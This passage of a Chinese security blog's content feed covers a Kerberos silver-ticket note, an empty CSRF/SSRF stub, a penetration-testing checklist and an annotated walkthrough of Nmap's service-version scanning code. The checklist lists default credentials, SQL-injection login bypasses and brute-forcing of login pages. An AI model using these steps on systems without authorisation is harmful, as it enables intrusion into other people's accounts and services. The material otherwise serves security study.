src="/2022/11/01/Kerberos-protocol-learning/4-3-2.png"></div><p>白银票据存在的安全风险在于，如果设置了PAC验证功能，票据就会发送到KDC进行验证，此时攻击将以失败告终。</p><hr><h1>参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/266491528">https://zhuanlan.zhihu.com/p/266491528</a><br><a href="https://www.anquanke.com/post/id/200680">https://www.anquanke.com/post/id/200680</a> （含委派攻击）<br><a href="https://www.cnblogs.com/luxianghao/p/5269739.html">https://www.cnblogs.com/luxianghao/p/5269739.html</a><br><a href="https://www.cnblogs.com/swordfall/p/12009716.html">https://www.cnblogs.com/swordfall/p/12009716.html</a></p></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF、SSRF和会话重放</title>
      <link href="/2022/09/29/CSRF-and-SSRF-and-Session_replay/"/>
      <url>/2022/09/29/CSRF-and-SSRF-and-Session_replay/</url>
      
        <content type="html"><![CDATA[<h1>1. CSRF</h1><h2 id="1-1">1.1.</h2><h1>2. SSRF</h1><h1>2.1.</h1><h1>3. 会话重放</h1><h1>3.1.</h1>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透经验总结</title>
      <link href="/2022/09/02/Penetration-experience-summary/"/>
      <url>/2022/09/02/Penetration-experience-summary/</url>
      
        <content type="html"><![CDATA[<h1>1. 资产搜集</h1><h2 id="1-1-利用FOFA，云悉等搜集web资产，并查看各种开发模板、组件版本等信息">1.1. 利用FOFA，云悉等搜集web资产，并查看各种开发模板、组件版本等信息</h2><h2 id="1-2-利用-dirsearch、御剑等工具扫描目录、文件">1.2. 利用 dirsearch、御剑等工具扫描目录、文件</h2><h2 id="1-3-利用-nmap-扫描，确认开放端口，寻找端口漏洞">1.3. 利用 nmap 扫描，确认开放端口，寻找端口漏洞</h2><h2 id="1-4-爱企查查找其他目标">1.4. 爱企查查找其他目标</h2><h1>2. 漏洞寻找</h1><h2 id="2-1-登陆界面">2.1. 登陆界面</h2><h3 id="2-1-1-手工尝试弱口令、SQL注入、XSS、URL重定向漏洞">2.1.1. 手工尝试弱口令、SQL注入、XSS、URL重定向漏洞</h3><p><strong>弱口令：</strong> admin/admin, admin/123456, test/123456, 111/111, admin/空密码</p><p><strong>SQL注入：</strong> 引号, 万能密码</p><h3 id="2-1-2-确定开发模板，寻找已知漏洞">2.1.2. 确定开发模板，寻找已知漏洞</h3><p><strong>OA系统：</strong> 致远OA、 泛微OA、 通达OA、 用友OA</p><p><strong>CMS系统：</strong> 织梦cms、 帝国cms、 phpcms</p><p>尝试默认密码</p><h3 id="2-1-3-F12-观察-js-代码里泄露的敏感信息">2.1.3. F12 观察 js 代码里泄露的敏感信息</h3><p>寻找 js 代码里泄露的密码、目录、具体文件，可能存在密码泄露、未授权访问等漏洞</p><p>针对网站框架固有的漏洞，如 webpack 打包工具可能还原打包前的 js 源码</p><h3 id="2-1-4-尝试是否存在逻辑漏洞">2.1.4. 尝试是否存在逻辑漏洞</h3><p>修改返回包的参数</p><h3 id="2-1-5-爆破账户名、密码">2.1.5. 爆破账户名、密码</h3><p>拥有一个品质上好的字典</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用python重构NMAP的服务版本扫描模块</title>
      <link href="/2022/08/29/NMAP-of-Python-refactoring/"/>
      <url>/2022/08/29/NMAP-of-Python-refactoring/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. NMAP 扫描原理</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">NMAP 服务与版本扫描命令：</span><br><span class="line">-sV: 指定让Nmap进行版本侦测</span><br><span class="line"> </span><br><span class="line">–version-intensity&lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</span><br><span class="line"></span><br><span class="line">–version-light: 指定使用轻量侦测方式 (intensity 2)</span><br><span class="line"> </span><br><span class="line">–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</span><br><span class="line"> </span><br><span class="line">–version-trace: 显示出详细的版本侦测过程信息。</span><br></pre></td></tr></table></figure><p>扫描原理是服务指纹（或称签名）对比匹配。Nmap内部包含了几千种常见服务指纹的数据库（nmap-service-probes），对目标端口进行连接通信，产生当前端口的服务指纹，再与指纹数据库对比，寻找出匹配的服务类型。</p><p>服务与版本侦测主要分为以下几个步骤：</p><ol><li><p>首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p></li><li><p>如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中ProbeTCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“Welcome Banner”信息。nmap将接收到的Banner与nmap-services-probes中NULLprobe中的签名进行对比。查找对应应用程序的名字与版本信息。</p></li><li><p>如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。</p></li><li><p>如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</p></li><li><p>如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</p></li><li><p>如果探测到应用程序是SunRPC，那么调用brute-forceRPC grinder进一步探测具体服务。</p></li></ol><h1>2. NMAP 实现框架</h1><h2 id="2-1-文件组织">2.1. 文件组织</h2><table><thead><tr><th>文件</th><th>功能</th></tr></thead><tbody><tr><td>service_scan.cc/service_scan.h</td><td>服务扫描的核心功能都在此两个文件中实现，文件结构清晰简洁，代码行数总共3000余行。与端口扫描部分类似，服务扫描也定义了不少类与接口函数。</td></tr><tr><td>nmap-service-probes</td><td>此文件是nmap服务扫描所需的数据库文件，包括定制的探测包及预期的回复包，及识别服务类型的具体匹配方式。</td></tr><tr><td>nsock library</td><td>服务与版本扫描部分用到nsock库，该库设计用于并发处理网络事件。在Nmap源码树下，有单独的nsock目录来管理nsock库。此处我们仅需要关注nsock.h文件中提供的API函数即可。</td></tr></tbody></table><p>下面摘取 nmap-service-probes 的片段，简单了解其结构</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Probe TCPNULL q||</span><br><span class="line"> </span><br><span class="line"># Wait forat least 6 seconds for data.  It used tobe 5, but some</span><br><span class="line"> </span><br><span class="line"># smtpservices have lately been instituting an artificial pause (see</span><br><span class="line"> </span><br><span class="line">#FEATURE(&#x27;greet_pause&#x27;) in Sendmail, for example)</span><br><span class="line"> </span><br><span class="line">totalwaitms6000</span><br><span class="line"> </span><br><span class="line">match 1c-server m|^S\xf5\xc6\x1a&#123;|p/1C:Enterprise business management server/</span><br><span class="line"> </span><br><span class="line">match4d-server m|^\0\0\0H\0\0\0\x02.[^\0]*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$|sp/4th Dimension database server/</span><br><span class="line"> </span><br><span class="line">match acapm|^\* ACAP IMPLEMENTATION&quot;CommuniGateProACAP(\d[?.\w]+)&quot;IMPLEMENTATION&quot;CommuniGateProACAP(\d[?.\w]+)&quot; |p/CommuniGate Pro ACAP server/ v/$1/ i/for mail client preference sharing/</span><br><span class="line"> </span><br><span class="line">match acmpm|^ACMP Server Version ([\w._-]+)\r\n| p/Aagon ACMP Inventory/ v/$1/</span><br><span class="line"> </span><br><span class="line">matchactivemq m|^\0\0\0.\x01ActiveMQ\0\0\0|s p/Apache ActiveMQ/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一行Probe关键字表示定义一个探测包，其类型为TCP，名字为NULL，探测字符串为空（q||）。以#开头为注释行，为读者提供参考信息。随后定义默认服务等待时间<code>totalwaims 6000</code>，即6秒钟。后面的match行，定义服务匹配的情况，即在此条件下认为此端口是运行的具体服务类型。match行的格式如下： <code>match []</code></p><p>service为服务名称，pattern为匹配的模式（正则表达式），versioninfo为该服务对应的版本信息。这里以 <code>match 1c-server m|^S\xf5\xc6\x1a&#123;| p/1C:Enterprise business management server/</code>为例，当使用NULL探测包获取的返回包中包含：<code>m|^S\xf5\xc6\x1a&#123;|</code>模式（该正则表达式含义：以字符S开头，紧随其后三个字符\xf5\xc6\x1a）时，并且从提取出厂商产品名字与<code>1C:Enterprise businessmanagement server</code>相符，那么判断该服务为<code>1c-server</code>。</p><h2 id="2-2-核心类分析">2.2. 核心类分析</h2><p>服务扫描过程中，主要构建了5个类，分别描述不同层次的数据类型。下面我们将以宏观到微观的思路，依次查看每个类的结构与用法。</p><table><thead><tr><th>类</th><th>结构与用法</th></tr></thead><tbody><tr><td>ServiceGroup</td><td>从整理的角度管理服务扫描过程</td></tr><tr><td>ServiceNFO</td><td>具体的负责管理每一种服务扫描过程</td></tr><tr><td>AllProbes</td><td>负责管理所有用于服务扫描的探测包</td></tr><tr><td>ServiceProbe</td><td>描述每一个进行服务探测的探测包细节（对应nmap-service-probes中描述的探测包）</td></tr><tr><td>ServiceProbeMatch</td><td>描述探测包的匹配类型（每一个ServiceProbe可能包含多种匹配类型）</td></tr></tbody></table><h3 id="2-2-1-ServiceGroup">2.2.1. ServiceGroup</h3><p>ServiceGroup用于管理一组目标机进行服务扫描的信息。这个类非常重要，负责统一管理其他具体的信息：如单个服务扫描信息（ServiceNFO）、全部探测包信息（AllProbes）、服务探测包信息（ServiceProbe）等等。</p><p>该类主要包含以下具体内容：</p><ol><li><p>扫描完成的服务列表services_finished，记录目前已经扫描完毕的服务。</p></li><li><p>正在扫描的服务列表services_in_progress。多个服务可能在同时并发地被探测，所以此处将当前正在扫描的服务全部记录在该列表中。</p></li><li><p>剩余服务列表services_remaining，当前还没有开始探测的服务被放置在该列表中。在服务扫描初始化时，所有的服务都被放置在列表中。</p></li><li><p>最大的并发探测包ideal_parallelism，用于确定同时发送服务探测包的并发数量，此值取决于用户配置的时序参数和具体网卡的支持能力等因素。若配置时序为-T4，那么会将ideal_parallelism设置40。</p></li><li><p>扫描进度测量器ScanProgressMeter，用于记录服务扫描的进度情况，以便能够实时地反馈给用户。在控制台界面按下普通按键（如按下空格键，不包括 “vVdDp?” 字符，这几个字符有特殊含义），Nmap会打印出当前的扫描进度。</p></li><li><p>超时主机的数量，记录当前扫描超时的主机数量。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This holds theservice information for a group of Targets being service scanned.</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceGroup</span> &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">ServiceGroup</span>(vector&lt;Target *&gt;&amp;Targets, AllProbes *AP);</span><br><span class="line"> </span><br><span class="line">  ~<span class="built_in">ServiceGroup</span>();</span><br><span class="line"> </span><br><span class="line">  list&lt;ServiceNFO *&gt; services_finished;<span class="comment">// Services finished (discovered or not)</span></span><br><span class="line"> </span><br><span class="line">  list&lt;ServiceNFO *&gt;services_in_progress; <span class="comment">// Services currently being probed</span></span><br><span class="line"> </span><br><span class="line">  list&lt;ServiceNFO *&gt; services_remaining;<span class="comment">// Probes not started yet</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ideal_parallelism; <span class="comment">// Max (anddesired) number of probes out at once.</span></span><br><span class="line"> </span><br><span class="line">  ScanProgressMeter *SPM;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> num_hosts_timedout; <span class="comment">// # of hosts timedout during (or before) scan</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-2-ServiceNFO">2.2.2. ServiceNFO</h3><p>ServiceNFO负责管理特定的服务的探测细节。上述的ServiceGroup中就是管理ServiceNFO对象组成的列表。</p><p>ServiceNFO类包含以下信息：</p><ol><li><p>服务指纹的管理（提供添加与获取等操作）</p></li><li><p>服务扫描对应的主机（Target *target）</p></li><li><p>服务探测匹配的信息（是否匹配、是否softmatch、ssl配置、产品、版本、CPE等信息）</p></li><li><p>管理探测包（服务扫描过程可能需要发送多个探测包，在此对当前探测包、下一个探测包<br>进行管理）</p></li><li><p>管理回复包（提供添加与获取等操作）。</p></li><li><p>服务扫描所需的全部探测包 AllProbes *AP;</p></li></ol><h3 id="2-2-3-AllProbes">2.2.3. AllProbes</h3><p>AllProbes负责管理全部的服务探测包（Probes）。该类的对象从nmap-service-probes数据库文件中解析出探测包及匹配方式等信息，将之管理起来。在后续服务扫描时，在此对象中来按需取出探测包发送即可。</p><p>AllProbes负责管理全部的服务探测包（Probes）。该类的对象从nmap-service-probes数据库文件中解析出探测包及匹配方式等信息，将之管理起来。在后续服务扫描时，在此对象中来按需取出探测包发送即可。</p><ol><li><p>探测包管理（探测包向量std::vectorprobes、NULL探测包等）</p></li><li><p>编制回退数组（compileFallbacks），当回复包无法匹配当前字符串时，允许回退到上一次匹配字符串。</p></li><li><p>管理排除端口列表。在nmap-service-probes中指定需排除的服务扫描，默认排除TCP的9100-9107端口，此类打印机服务会返回大量的无用信息。</p></li><li><p>服务初始化接口与释放接口。</p></li></ol><h3 id="2-2-4-ServiceProbe">2.2.4. ServiceProbe</h3><p>ServiceProbe负责管理单个的服务探测包的详细信息。服务探测包具体的信息来自nmap-service-probes数据库文件，当AllProbes类在初始化时会读取该文件，并依据其每个探测信息创建ServiceProbe对象，放置在AllProbes内部的向量std::vectorprobes中。</p><p>该类主要包含以下内容：</p><ol><li><p>探测包名字，比如探测包名字叫NULL或GenericLines等等。</p></li><li><p>探测包字符串及字符串长度。非NULL探测包都包含探测需要字符串，所以此处对该信息进行管理。例如，对于探测包：Probe TCP GenericLinesq|\r\n\r\n|，其探测字符串为\r\n\r\n。</p></li><li><p>允许的端口及SSL端口。除NULL外，探测包通常只会针对特定的端口扫描才有效，所以此处即管理该探测包允许的扫描的端口。</p></li><li><p>探测包的协议类型probeprotocol，只能是TCP或UDP。</p></li><li><p>可被探测的服务类型detectedServices。与允许端口类似，探测包可能只能用于某些特定的服务的探测，所以此处统一管理能被探测的服务类型。</p></li><li><p>服务探测包匹配管理。该类中使用向量std::vector matches来管理此服务探测包可能会匹配的情况，匹配情况对应到nmap-service-probes中的match与softmatch行。</p></li><li><p>探测回退数组（fallback array）的管理，此对应到AllProbes中compileFallbacks()函数，此处管理具体的服务探测包进行回退的数组。数组结构：ServiceProbe*fallbacks[MAXFALLBACKS+1];</p></li><li><p>测试是否匹配，此接口函数用于测试某个回复包是否与预期结果匹配。</p></li><li><p>其他接口函数，管理其他普通信息。</p></li></ol><h3 id="2-2-5-ServiceProbeMatch">2.2.5. ServiceProbeMatch</h3><p>ServiceProbeMatch用于管理特定的服务探测包的匹配信息（match）。nmap-service-probes文件中每一个match和softmatch行都对应到该类的对象。</p><p>该类信息比较丰富，以下仅简要描述：</p><ol><li><p>探测包匹配详细信息（版本、产品、CPE等等）</p></li><li><p>探测匹配情况（匹配类型、匹配字符串、正则表达式等等）</p></li><li><p>测试是否匹配接口函数。若匹配成功，返回详细的服务与版本信息。</p></li></ol><h2 id="2-3-代码流程">2.3. 代码流程</h2><p>在nmap.cc文件的nmap_main()函数中，如果配置了服务扫描，那么调用service_scan()函数（位于service_scan.cc文件中）。服务扫描的内容主要在service_scan()函数中完成。</p><p>service_scan()函数比较简洁，只有120多行代码。因为服务扫描涉及到具体详细的操作都封装到类或其他的静态非成员函数中了，而并发处理网络事件部分调用nsock库来处理。</p><p><strong>NMAP 服务与版本扫描详细过程：</strong></p><div class="center"><img src="/2022/08/29/NMAP-of-Python-refactoring/2.3-2.png"></div><p><strong>流程解析：</strong></p><ol><li><p>首先在nmap_main()中将扫描目标机传入service_scan()函数中，以便根据目标机端口状态来筛选需要扫描的服务。</p></li><li><p>然后，在AllProbes:: service_scan_init()读取nmap-service-probes文件，解析出被排除的端口、扫描过程需要的探测包、探测包匹配等详细信息。将信息存放在AllProbes对象内。</p></li><li><p>随后，根据Targets和AllProbes创建服务组对象（ServiceGroup），从Targets中解析出开放的端口与处于open|filtered状态的端口，创建对应的ServiceNFO对象，该服务等待被扫描。并创建扫描进度测量器，以便后续打印出扫描进度；确定最佳的扫描并发度ideal_parallelism。</p></li><li><p>然后，确定排除端口。默认情况下，排除nmap-service-probes中指定的端口Exclude T:9100-9107；而如果用户命令行指定–all-ports，那么不排除Exclude指定的端口。</p></li><li><p>为每个目标机设置超时时钟，获取当前时间。</p></li><li><p>然后开始进入关键环节，创建nsock pool，即nsock处理并发探测包的事件池。在创建nsock pool后，服务扫描才能使用nsock建立连接并注册事件。</p></li><li><p>根据用户需求，设置服务扫描的trace信息。</p></li><li><p>若配置了openssl时，将其速度设置为最大。因为对于服务扫描，仅关心端口的服务类型，不必在安全性花费过多时间。</p></li><li><p>然后开始启动少量的服务探测包（launchSomeServiceProbes）。根据前述步骤得出的服务探测包，创建nsock niod（io描述符，类似于文件描述符，管理输入输出），完成地址等信息配置，然后建立TCP连接或UDP连接，在建立连接后向nsock pool注册事件。此后，该连接的事件将交给nsock loop来统一处理。</p></li><li><p>创建nsock主循环（nsock_loop），在此循环中来接收网络事件（例如接收到回复包），调用相应的处理函数对事件响应（函数servicescan_read_handler()、servicescan_write_handler()、servicescan_connect_handler()）。在处理函数中，扫描完成了某些服务后，会再调用launchSomeServiceProbes()函数加载剩余的服务进来扫描，以此整个服务扫描过程就被有序地连接起来了。</p></li><li><p>当nsock循环退出，检查是否有错，并删除nsock pool对象。</p></li><li><p>打印出调试信息，处理最终扫描结果。</p></li></ol><p><strong>源码注释：</strong></p><div class="center"><img src="/2022/08/29/NMAP-of-Python-refactoring/2.3-1.png"></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Execute a service fingerprinting scan against all open ports of the</span></span><br><span class="line"><span class="comment">   Targets specified. */</span></span><br><span class="line"><span class="comment">///针对指定目标机的开放的端口进行服务指纹扫描，</span></span><br><span class="line"><span class="comment">///此处会用到Nmap的nsock库（并发的Socket Event处理库）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">service_scan</span><span class="params">(vector&lt;Target *&gt; &amp;Targets)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// int service_scan(Target *targets[], int num_targets)</span></span><br><span class="line">  AllProbes *AP;</span><br><span class="line">  ServiceGroup *SG;</span><br><span class="line">  nsock_pool nsp;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> now;</span><br><span class="line">  <span class="type">int</span> timeout;</span><br><span class="line">  <span class="keyword">enum</span> <span class="title class_">nsock_loopstatus</span> looprc;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> starttv;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (Targets.<span class="built_in">size</span>() == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">  AP = AllProbes::<span class="built_in">service_scan_init</span>();<span class="comment">///获取AllProbes对象,AllProbes仅维护一个Static对象</span></span><br><span class="line">  <span class="comment">///在service_scan_init()中将读取nmap-service-probes文件，解析出需要的探测包,并存放在</span></span><br><span class="line">  <span class="comment">///AllProbes中std::vector&lt;ServiceProbe *&gt; probes向量中。</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Now I convert the targets into a new ServiceGroup</span></span><br><span class="line">  <span class="comment">///使用Targets向量与AllProbes创建服务组ServiceGroup,从Targets中提取open端口及</span></span><br><span class="line">  <span class="comment">///open|filtered端口，放入services_remaining等待进行服务扫描。</span></span><br><span class="line">  <span class="comment">///在创建服务组时，确定出服务扫描的最佳并发度ideal_parallelism</span></span><br><span class="line">  SG = <span class="keyword">new</span> <span class="built_in">ServiceGroup</span>(Targets, AP);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (o.override_excludeports) &#123;</span><br><span class="line">    <span class="comment">///覆盖被排除端口，当命令行中指定--all-ports时会走到此分支。</span></span><br><span class="line">    <span class="comment">///被排除的端口是指在nmap-service-probes文件用Exclude指令定义的端口。</span></span><br><span class="line">    <span class="keyword">if</span> (o.debugging || o.verbose) <span class="built_in">log_write</span>(LOG_PLAIN, <span class="string">&quot;Overriding exclude ports option! Some undesirable ports may be version scanned!\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">///从ServiceGroup中移除被排除的端口,Nmap默认会排出掉9100-9107与打印机相关的服务，</span></span><br><span class="line">    <span class="comment">///因为此类服务只是简单返回Nmap发送过去的探测包，会产生大量的垃圾的流量。</span></span><br><span class="line">    <span class="comment">///默认情况下在nmap-service-probes文件头部定义：Exclude T:9100-9107</span></span><br><span class="line">    <span class="built_in">remove_excluded_ports</span>(AP, SG);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">///为所有需要进行服务扫描的主机设置超时值</span></span><br><span class="line">  <span class="built_in">startTimeOutClocks</span>(SG);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (SG-&gt;services_remaining.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> SG;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;starttv, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (o.verbose) &#123;</span><br><span class="line">    <span class="type">char</span> targetstr[<span class="number">128</span>];</span><br><span class="line">    <span class="type">bool</span> plural = (Targets.<span class="built_in">size</span>() != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!plural) &#123;</span><br><span class="line">      (*(Targets.<span class="built_in">begin</span>()))-&gt;<span class="built_in">NameIP</span>(targetstr, <span class="built_in">sizeof</span>(targetstr));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">Snprintf</span>(targetstr, <span class="built_in">sizeof</span>(targetstr), <span class="string">&quot;%u hosts&quot;</span>, (<span class="type">unsigned</span>) Targets.<span class="built_in">size</span>());</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">log_write</span>(LOG_STDOUT, <span class="string">&quot;Scanning %u %s on %s\n&quot;</span>,</span><br><span class="line">          (<span class="type">unsigned</span>) SG-&gt;services_remaining.<span class="built_in">size</span>(),</span><br><span class="line">          (SG-&gt;services_remaining.<span class="built_in">size</span>() == <span class="number">1</span>)? <span class="string">&quot;service&quot;</span> : <span class="string">&quot;services&quot;</span>,</span><br><span class="line">          targetstr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Lets create a nsock pool for managing all the concurrent probes</span></span><br><span class="line">  <span class="comment">// Store the servicegroup in there for availability in callbacks</span></span><br><span class="line">  <span class="comment">///创建nsock pool，以使用nsock并发控制探测包</span></span><br><span class="line">  <span class="keyword">if</span> ((nsp = <span class="built_in">nsp_new</span>(SG)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;%s() failed to create new nsock pool.&quot;</span>, __func__);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">///根据用户指定的packettrace配置，设置nsock的trace级别</span></span><br><span class="line">  <span class="keyword">if</span> (o.<span class="built_in">versionTrace</span>()) &#123;</span><br><span class="line">    <span class="built_in">nsp_settrace</span>(nsp, <span class="literal">NULL</span>, NSOCK_TRACE_LEVEL, o.<span class="built_in">getStartTime</span>());</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_OPENSSL</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t care about connection security in version detection. */</span></span><br><span class="line">  <span class="comment">///配置SSL时，关注传输速度，而不关注安全性本身，以加速服务扫描过程。</span></span><br><span class="line">  <span class="built_in">nsp_ssl_init_max_speed</span>(nsp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">///从service_remaining列表中找出满足条件的等待探测服务，对之进行配置，</span></span><br><span class="line">  <span class="comment">///创建nsock文件描述符(niod)，并通过nsock建立连接（如nsock_connect_tcp()），</span></span><br><span class="line">  <span class="comment">///并将此探测服务移动到services_in_progress列表中。</span></span><br><span class="line">  <span class="built_in">launchSomeServiceProbes</span>(nsp, SG);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// How long do we have before timing out?</span></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;now, <span class="literal">NULL</span>);</span><br><span class="line">  timeout = <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// OK!  Lets start our main loop!</span></span><br><span class="line">  <span class="comment">///nsock主循环，在此循环内处理各种探测包的事件(nsock event)</span></span><br><span class="line">  <span class="comment">///在上述的launchSomeServiceProbes操作中，调用到nsock_connect_tcp/udp/sctp等，</span></span><br><span class="line">  <span class="comment">///最终执行nsp_add_event函数向nsock pool添加等待处理的事件。</span></span><br><span class="line">  looprc = <span class="built_in">nsock_loop</span>(nsp, timeout);</span><br><span class="line">  <span class="keyword">if</span> (looprc == NSOCK_LOOP_ERROR) &#123;</span><br><span class="line">    <span class="type">int</span> err = <span class="built_in">nsp_geterrorcode</span>(nsp);</span><br><span class="line">    <span 